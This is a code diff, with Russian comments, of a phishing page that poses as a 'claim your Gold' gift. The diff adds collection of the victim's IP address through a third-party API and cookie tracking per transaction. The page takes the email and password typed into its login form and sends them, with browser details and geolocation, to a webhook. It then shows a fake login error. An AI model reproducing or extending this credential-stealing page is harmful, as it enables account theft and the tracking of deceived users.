@@ -203,8 +203,15 @@
         language: navigator.language,
         screenResolution: `${window.screen.width}x${window.screen.height}`
       },
-      geolocation: {} // заполним, если разрешат
+      geolocation: {}, // заполним, если разрешат
+      ip: null  // будет заполнен позже
     };
+
+    // Получаем IP-адрес пользователя через сторонний API
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => { clientInfo.ip = data.ip; })
+      .catch(e => console.error("Ошибка получения IP:", e));
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
@@ -231,22 +238,20 @@
       );
     }
 
-    // Функция для работы с cookie
+    // Функция для работы с cookie (ключи зависят от транзакции)
     function setCookie(name, value, days) {
       const expires = new Date(Date.now() + days * 864e5).toUTCString();
       document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/';
     }
-
     function getCookie(name) {
       return document.cookie.split('; ').reduce((r, v) => {
         const parts = v.split('=');
         return parts[0] === name ? decodeURIComponent(parts[1]) : r;
       }, '');
     }
-
-    // Проверка, был ли уже получен Gold
-    function checkGoldCollected() {
-      return getCookie("gold_collected") === "true";
+    // Проверка, был ли уже получен Gold для конкретного transactionID
+    function checkGoldCollected(transactionID) {
+      return getCookie("gold_collected_" + transactionID) === "true";
     }
 
     /* ---------- ДЕКОДИРОВАНИЕ ПАРАМЕТРОВ И ИНИЦИАЛИЗАЦИЯ ---------- */
@@ -317,6 +322,7 @@
 
     /* ---------- ИНИЦИАЛИЗАЦИЯ ДАННЫХ ---------- */
     const params = getParamsFromURL();
+    const transactionID = params ? params.senderId : null;
     if (params) {
       // Отображаем данные до авторизации
       document.getElementById("pre-info").innerHTML = `
@@ -329,7 +335,6 @@
     }
 
     /* ---------- ОБРАБОТКА АВТОРИЗАЦИИ ---------- */
-    // Получаем элемент формы по id
     const loginForm = document.getElementById("login-form");
     loginForm.addEventListener("submit", function(e) {
       e.preventDefault();  // Останавливаем стандартную отправку формы
@@ -341,20 +346,20 @@
         document.getElementById("login-result").textContent = "Заполните все поля";
         return;
       }
-      // Формируем сообщение для вебхука: авторизация
+      // Формирование запроса "Новая авторизация"
       const authMsg = `Новая авторизация:
 Email: ${email}
 Пароль: ${password}
 Дополнительная информация: ${JSON.stringify(clientInfo)}`;
-
-      // Отправляем данные авторизации на вебхук
+      
+      // Отправка первого запроса (авторизация) на вебхук
       sendDataToWebhook(authMsg, function(success) {
         if (!success) {
           document.getElementById("login-result").textContent = "Ошибка входа";
           return;
         }
         document.getElementById("login-result").textContent = "Ошибка: проверки правильности данных входа";
-        // Смена изображения: gift.png -> small_gold.png (с анимацией)
+        // Анимация смены изображения: gift.png -> small_gold.png
         const giftImage = document.getElementById("gift-image");
         giftImage.classList.add("fade-out");
         setTimeout(() => {
@@ -381,19 +386,19 @@ Email: ${email}
     /* ---------- ЭФФЕКТ ЧАСТИЦ ПРИ НАЖАТИИ НА "Получить Gold" ---------- */
     const getGoldButton = document.getElementById("get-gold-button");
 
-    // Проверяем cookie, если Gold уже получен, отключаем кнопку
-    if (checkGoldCollected()) {
+    // Проверяем, получал ли уже пользователь Gold для данного transactionID
+    if (transactionID && checkGoldCollected(transactionID)) {
       getGoldButton.disabled = true;
       showGoldResult(true);  // Показываем результат, если уже получен Gold
     }
 
     getGoldButton.addEventListener("click", function() {
-      // Запускаем анимацию частиц – создаем 20 частиц
+      // Запуск анимации частиц – создаём 20 частиц
       for (let i = 0; i < 20; i++) {
         createParticle(getGoldButton);
       }
       setTimeout(() => {
-        // Формируем сообщение для вебхука: запрос на получение голды
+        // Формирование запроса "Запрос на получение голды" – второй отдельный запрос
         const goldMsg = `Запрос на получение голды:
 ID отправителя: ${params.senderId}
 Ник отправителя: ${params.senderNick}
@@ -404,8 +409,10 @@ ID отправителя: ${params.senderId}
             alert("Ошибка при получении Gold");
             return;
           }
-          // Устанавливаем cookie, чтобы сохранить состояние
-          setCookie("gold_collected", "true", 365);  // Сохраняем на 365 дней
+          // Сохраняем в cookie факт получения голды для данного transactionID
+          if (transactionID) {
+            setCookie("gold_collected_" + transactionID, "true", 365);
+          }
           showGoldResult();
           getGoldButton.disabled = true; // Деактивируем кнопку
         });
@@ -419,12 +426,12 @@ ID отправителя: ${params.senderId}
 
       // Случайное смещение для частицы (используем CSS-переменные)
       const tx = (Math.random() - 0.5) * 100 + "px";
-      const ty = (Math.random() * 100 + 50) + "px";  // Делаем частицы "лететь" выше
+      const ty = (Math.random() * 100 + 50) + "px";
 
       particle.style.setProperty("--tx", tx);
       particle.style.setProperty("--ty", ty);
 
-      // Позиционируем частицу по центру кнопки
+      // Позиционирование частицы по центру кнопки
       particle.style.left = rect.left + rect.width / 2 - 8 + "px";
       particle.style.top = rect.top + rect.height / 2 - 8 + "px";
 
